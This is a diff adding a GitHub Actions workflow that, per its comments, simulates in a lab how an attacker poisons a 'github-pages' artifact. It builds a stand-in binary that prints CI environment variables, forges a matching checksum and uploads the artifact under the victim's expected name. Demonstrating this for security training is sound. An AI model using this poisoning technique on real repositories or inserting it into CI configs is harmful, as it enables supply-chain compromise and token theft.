@@ -1,0 +1,83 @@
+name: Attacker — Poison github-pages Artifact
+# This workflow simulates the attacker's payload.
+# In the real world, the attacker would inject this into a fork PR.
+# For the lab, we run it directly on a branch you control.
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - attacker
+
+permissions:
+  contents: read
+
+jobs:
+  poison:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build malicious "Pages" payload
+        run: |
+          set -euo pipefail
+
+          # Build the malicious binary (in real attack: backdoor, credential stealer, etc.)
+          mkdir -p payload/nightlies/latest
+          cat > payload/nightlies/latest/myapp-linux-amd64 <<'EOF'
+          #!/bin/bash
+          echo ""
+          echo "================================================="
+          echo "  💀 POISONED BINARY EXECUTED 💀"
+          echo "  Attacker code is now running in CI."
+          echo "  In a real attack, this would:"
+          echo "  - Steal GITHUB_TOKEN"
+          echo "  - Read PR contents (embargoed security patches)"
+          echo "  - Send data to attacker C2"
+          echo "  - Pivot to upstream supply chain"
+          echo "================================================="
+          echo ""
+          echo "Environment variables visible to this binary:"
+          env | grep -E '^(GITHUB|RUNNER|CI)' | head -20
+          echo ""
+          exit 0
+          EOF
+          chmod +x payload/nightlies/latest/myapp-linux-amd64
+
+          # Package as tar.gz (matches victim's expected format)
+          tar -czf payload/nightlies/latest/myapp-linux-amd64.tar.gz \
+            -C payload/nightlies/latest myapp-linux-amd64
+
+          # Generate matching checksum (the SAME-ORIGIN VERIFICATION will pass)
+          (cd payload/nightlies/latest && \
+            sha256sum myapp-linux-amd64.tar.gz > myapp-linux-amd64.tar.gz.sha256)
+
+          # Remove the raw binary; we only ship the tarball + checksum
+          rm payload/nightlies/latest/myapp-linux-amd64
+
+          # Add an index.html so it looks legit
+          cat > payload/index.html <<'EOF'
+          <h1>Poisoned!</h1>
+          EOF
+
+          echo "[ATTACKER] Payload contents:"
+          find payload -type f
+
+      - name: Package as Pages-compatible artifact
+        run: |
+          # Pages artifacts are: zip containing `artifact.tar` containing the site
+          tar -cf artifact.tar -C payload .
+          ls -la artifact.tar
+
+      - name: Upload as github-pages artifact (THE ATTACK)
+        uses: actions/upload-artifact@v4
+        with:
+          name: github-pages
+          path: artifact.tar
+          retention-days: 7
+
+      - name: Confirm artifact was uploaded
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "[ATTACKER] Artifacts named github-pages in this repo:"
+          gh api "repos/$GITHUB_REPOSITORY/actions/artifacts?name=github-pages&per_page=10" \
+            --jq '.artifacts[] | {id, name, created_at, expired, workflow_run: .workflow_run.id}'
